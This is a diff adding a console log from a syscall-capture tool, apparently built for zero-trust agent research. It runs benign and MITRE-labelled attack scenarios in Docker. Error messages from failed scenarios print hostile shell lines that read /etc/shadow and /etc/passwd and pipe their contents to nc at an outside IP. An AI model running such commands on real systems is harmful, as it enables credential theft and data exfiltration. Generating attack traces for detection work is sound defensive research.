@@ -1,0 +1,40 @@
+========================================
+SENTINEL Real Syscall Capture
+Mode: docker  Platform: Darwin Juharashas-MacBook-Pro.local 25.5.0 Darwin Kernel Version 25.5.0: Mon Apr 27 20:39:29 PDT 2026; root:xnu-12377.121.6~2/RELEASE_ARM64_T8142 arm64
+Output: /Users/jshaik/projects/EB1A/IEEETechnicalPapers/Paper1_ZeroTrustAgent/data/input/real_traces
+========================================
+Preparing Docker image with strace...
+DEPRECATED: The legacy builder is deprecated and will be removed in a future release.
+            Install the buildx component to build images with BuildKit:
+            https://docs.docker.com/go/buildx/
+
+sha256:cdef636b97246129c984e922b358de096b37090233e64b936bdd4914a353c7df
+
+── Core scenarios (15) ──
+  [docker] benign_cat_hostname
+  [docker] benign_ls_usr
+  [docker] benign_python_json
+  [docker] benign_find_libs
+  [docker] benign_cat_os_release
+  [docker] benign_python_math
+  [docker] benign_which_bash
+  [docker] attack_T1003_shadow
+  File "<string>", line 1
+    import json; print(json.dumps('''bash -c 'cat /etc/shadow 2>/dev/null; cat /etc/passwd''''))
+                                                                                             ^
+SyntaxError: unterminated string literal (detected at line 1)
+  [docker] attack_T1003_T1071
+  File "<string>", line 1
+    import json; print(json.dumps('''bash -c 'cat /etc/passwd > /tmp/.x; nc -w1 -z 10.0.0.1 4444 || true''''))
+                                                                                                           ^
+SyntaxError: unterminated string literal (detected at line 1)
+  [docker] attack_T1059_scripted
+  [docker] attack_T1068_setuid
+  [docker] attack_T1055_ptrace
+  [docker] attack_T1041_exfil
+  File "<string>", line 1
+    import json; print(json.dumps('''bash -c 'cat /etc/passwd /etc/hostname > /tmp/data.txt; nc -w1 34.56.78.90 443 < /tmp/data.txt || true''''))
+                                                                                                                                              ^
+SyntaxError: unterminated string literal (detected at line 1)
+  [docker] attack_T1562_evasion
+  [docker] attack_T1078_valid_accts
